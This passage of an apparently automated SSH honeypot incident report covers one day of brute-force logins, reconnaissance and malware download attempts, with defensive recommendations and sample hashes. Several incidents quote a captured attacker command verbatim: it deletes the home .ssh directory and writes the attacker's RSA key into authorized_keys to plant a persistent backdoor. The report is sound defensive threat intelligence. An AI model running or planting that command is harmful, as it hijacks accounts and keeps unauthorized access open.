| `2026-05-11 13:32:51` | `cowrie.command.failed` |
| `2026-05-11 13:32:51` | `cowrie.log.closed` |
| `2026-05-11 13:32:52` | `cowrie.session.params` |
| `2026-05-11 13:32:52` | `cowrie.command.input` |
| `2026-05-11 13:32:52` | `cowrie.session.file_download` |
| `2026-05-11 13:32:52` | `cowrie.log.closed` |
| `2026-05-11 13:32:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eeca006ee6e

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:32 |
| **Last Seen** | 2026-05-11 13:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:32:55` | `cowrie.session.connect` |
| `2026-05-11 13:32:55` | `cowrie.client.version` |
| `2026-05-11 13:32:55` | `cowrie.client.kex` |
| `2026-05-11 13:32:56` | `cowrie.login.success` |
| `2026-05-11 13:32:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13a747d3381d

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:34 |
| **Last Seen** | 2026-05-11 13:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:34:42` | `cowrie.session.connect` |
| `2026-05-11 13:34:42` | `cowrie.client.version` |
| `2026-05-11 13:34:42` | `cowrie.client.kex` |
| `2026-05-11 13:34:43` | `cowrie.login.success` |
| `2026-05-11 13:34:44` | `cowrie.session.params` |
| `2026-05-11 13:34:44` | `cowrie.command.input` |
| `2026-05-11 13:34:44` | `cowrie.command.failed` |
| `2026-05-11 13:34:44` | `cowrie.log.closed` |
| `2026-05-11 13:34:45` | `cowrie.session.params` |
| `2026-05-11 13:34:45` | `cowrie.command.input` |
| `2026-05-11 13:34:45` | `cowrie.session.file_download` |
| `2026-05-11 13:34:45` | `cowrie.log.closed` |
| `2026-05-11 13:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1327378f87e

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:34 |
| **Last Seen** | 2026-05-11 13:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:34:48` | `cowrie.session.connect` |
| `2026-05-11 13:34:48` | `cowrie.client.version` |
| `2026-05-11 13:34:48` | `cowrie.client.kex` |
| `2026-05-11 13:34:49` | `cowrie.login.success` |
| `2026-05-11 13:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b073bd56c7a

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-05-11 13:42 |
| **Last Seen** | 2026-05-11 13:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:42:37` | `cowrie.session.connect` |
| `2026-05-11 13:42:37` | `cowrie.client.version` |
| `2026-05-11 13:42:38` | `cowrie.client.kex` |
| `2026-05-11 13:42:38` | `cowrie.login.success` |
| `2026-05-11 13:42:38` | `cowrie.session.params` |
| `2026-05-11 13:42:38` | `cowrie.command.input` |
| `2026-05-11 13:42:38` | `cowrie.command.failed` |
| `2026-05-11 13:42:39` | `cowrie.log.closed` |
| `2026-05-11 13:42:39` | `cowrie.session.params` |
| `2026-05-11 13:42:39` | `cowrie.command.input` |
| `2026-05-11 13:42:39` | `cowrie.session.file_download` |
| `2026-05-11 13:42:39` | `cowrie.log.closed` |
| `2026-05-11 13:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9943563a64de

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-05-11 13:42 |
| **Last Seen** | 2026-05-11 13:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:42:41` | `cowrie.session.connect` |
| `2026-05-11 13:42:41` | `cowrie.client.version` |
| `2026-05-11 13:42:42` | `cowrie.client.kex` |
| `2026-05-11 13:42:42` | `cowrie.login.success` |
| `2026-05-11 13:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80ecfe6114cb

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:44 |
| **Last Seen** | 2026-05-11 13:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:44:00` | `cowrie.session.connect` |
| `2026-05-11 13:44:00` | `cowrie.client.version` |
| `2026-05-11 13:44:01` | `cowrie.client.kex` |
| `2026-05-11 13:44:01` | `cowrie.login.success` |
| `2026-05-11 13:44:02` | `cowrie.session.params` |
| `2026-05-11 13:44:02` | `cowrie.command.input` |
| `2026-05-11 13:44:02` | `cowrie.command.failed` |
| `2026-05-11 13:44:02` | `cowrie.log.closed` |
| `2026-05-11 13:44:03` | `cowrie.session.params` |
| `2026-05-11 13:44:03` | `cowrie.command.input` |
| `2026-05-11 13:44:03` | `cowrie.session.file_download` |
| `2026-05-11 13:44:03` | `cowrie.log.closed` |
| `2026-05-11 13:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1a2fd1178e3

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:44 |
| **Last Seen** | 2026-05-11 13:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:44:06` | `cowrie.session.connect` |
| `2026-05-11 13:44:06` | `cowrie.client.version` |
| `2026-05-11 13:44:06` | `cowrie.client.kex` |
| `2026-05-11 13:44:07` | `cowrie.login.success` |
| `2026-05-11 13:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50cd59eb83a1

| Field | Detail |
|---|---|
| **Source IP** | `114.35.59[.]237` |
| **First Seen** | 2026-05-11 13:45 |
| **Last Seen** | 2026-05-11 13:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:45:41` | `cowrie.session.connect` |
| `2026-05-11 13:45:41` | `cowrie.client.version` |
| `2026-05-11 13:45:41` | `cowrie.client.kex` |
| `2026-05-11 13:45:42` | `cowrie.login.success` |
| `2026-05-11 13:45:42` | `cowrie.session.params` |
| `2026-05-11 13:45:42` | `cowrie.command.input` |
| `2026-05-11 13:45:42` | `cowrie.command.failed` |
| `2026-05-11 13:45:42` | `cowrie.log.closed` |
| `2026-05-11 13:45:43` | `cowrie.session.params` |
| `2026-05-11 13:45:43` | `cowrie.command.input` |
| `2026-05-11 13:45:43` | `cowrie.session.file_download` |
| `2026-05-11 13:45:43` | `cowrie.log.closed` |
| `2026-05-11 13:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.35.59[.]237` to AbuseIPDB if not already reported
- [ ] Block `114.35.59[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5cc75b51117

| Field | Detail |
|---|---|
| **Source IP** | `114.35.59[.]237` |
| **First Seen** | 2026-05-11 13:45 |
| **Last Seen** | 2026-05-11 13:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:45:45` | `cowrie.session.connect` |
| `2026-05-11 13:45:45` | `cowrie.client.version` |
| `2026-05-11 13:45:45` | `cowrie.client.kex` |
| `2026-05-11 13:45:46` | `cowrie.login.success` |
| `2026-05-11 13:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.35.59[.]237` to AbuseIPDB if not already reported
- [ ] Block `114.35.59[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99757a0d0a01

| Field | Detail |
|---|---|
| **Source IP** | `115.85.80[.]12` |
| **First Seen** | 2026-05-11 15:15 |
| **Last Seen** | 2026-05-11 15:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 15:15:38` | `cowrie.session.connect` |
| `2026-05-11 15:15:39` | `cowrie.client.version` |
| `2026-05-11 15:15:39` | `cowrie.client.kex` |
| `2026-05-11 15:15:39` | `cowrie.login.success` |
| `2026-05-11 15:15:39` | `cowrie.session.params` |
| `2026-05-11 15:15:39` | `cowrie.command.input` |
| `2026-05-11 15:15:39` | `cowrie.command.failed` |
| `2026-05-11 15:15:39` | `cowrie.log.closed` |
| `2026-05-11 15:15:39` | `cowrie.session.params` |
| `2026-05-11 15:15:39` | `cowrie.command.input` |
| `2026-05-11 15:15:39` | `cowrie.session.file_download` |
| `2026-05-11 15:15:39` | `cowrie.log.closed` |
| `2026-05-11 15:15:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.85.80[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.85.80[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fdb766afe41

| Field | Detail |
|---|---|
| **Source IP** | `115.85.80[.]12` |
| **First Seen** | 2026-05-11 15:15 |
| **Last Seen** | 2026-05-11 15:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 15:15:41` | `cowrie.session.connect` |
| `2026-05-11 15:15:41` | `cowrie.client.version` |
| `2026-05-11 15:15:41` | `cowrie.client.kex` |
| `2026-05-11 15:15:41` | `cowrie.login.success` |
| `2026-05-11 15:15:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.85.80[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.85.80[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.121.145[.]41` | **81** | 2026-05-11 11:28 | 2026-05-11 14:16 | 48m | 0 | `T1592` | 🟠 MEDIUM |
| `114.35.59[.]237` | **30** | 2026-05-11 13:06 | 2026-05-11 13:58 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.154.227[.]158` | **30** | 2026-05-11 12:01 | 2026-05-11 13:15 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `210.149.87[.]82` | **30** | 2026-05-11 14:16 | 2026-05-11 14:43 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `212.154.234[.]9` | **30** | 2026-05-11 12:55 | 2026-05-11 13:49 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `213.6.203[.]226` | **30** | 2026-05-11 13:01 | 2026-05-11 13:58 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.80.91[.]81` | **28** | 2026-05-11 14:33 | 2026-05-11 15:04 | 0m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.26[.]93` | **7** | 2026-05-11 14:11 | 2026-05-11 14:30 | 14m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-05-11 12:40 | 2026-05-11 12:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.106[.]58` | **2** | 2026-05-11 12:59 | 2026-05-11 12:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **2** | 2026-05-11 12:09 | 2026-05-11 12:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.219.222[.]66` | **2** | 2026-05-11 13:48 | 2026-05-11 13:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.216.219[.]24` | 1 | 2026-05-11 13:58 | 2026-05-11 13:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.189.235[.]176` | 1 | 2026-05-11 12:51 | 2026-05-11 12:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.142[.]171` | 1 | 2026-05-11 12:51 | 2026-05-11 12:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.85.80[.]12` | 1 | 2026-05-11 15:15 | 2026-05-11 15:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.122[.]187` | 1 | 2026-05-11 14:11 | 2026-05-11 14:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.93.114[.]62` | 1 | 2026-05-11 15:16 | 2026-05-11 15:16 | 31s | 0 | `T1592` | 🟢 LOW |
| `18.208.181[.]202` | 1 | 2026-05-11 12:56 | 2026-05-11 12:56 | 1s | 0 | `T1592` | 🟢 LOW |
| `180.76.176[.]249` | 1 | 2026-05-11 11:41 | 2026-05-11 11:41 | 4s | 0 | `T1592` | 🟢 LOW |
| `182.43.235[.]218` | 1 | 2026-05-11 14:13 | 2026-05-11 14:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `213.230.127[.]104` | 1 | 2026-05-11 15:17 | 2026-05-11 15:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.206.115[.]167` | 1 | 2026-05-11 12:26 | 2026-05-11 12:26 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `8.219.222[.]66` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 50 |
| `114.35.59[.]237` | TW | Data Communication Business Group, | **100** ⚠️ | 25 |
| `101.126.26[.]93` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `18.208.181[.]202` | US | Amazon Technologies Inc. | **100** ⚠️ | 41 |
| `212.154.234[.]9` | KZ | Co-location | **100** ⚠️ | 50 |
| `185.80.91[.]81` | RU | New Hosting Technologies LLC | **100** ⚠️ | 5 |
| `103.189.235[.]176` | SG | Cloud Host Pte Ltd | **100** ⚠️ | 50 |
| `213.6.203[.]226` | PS | Palestine Telecommunications Company (PALTEL) | **100** ⚠️ | 50 |
| `3.129.187[.]38` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `45.121.145[.]41` | MY | Invision Seven Solutions | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 219 |
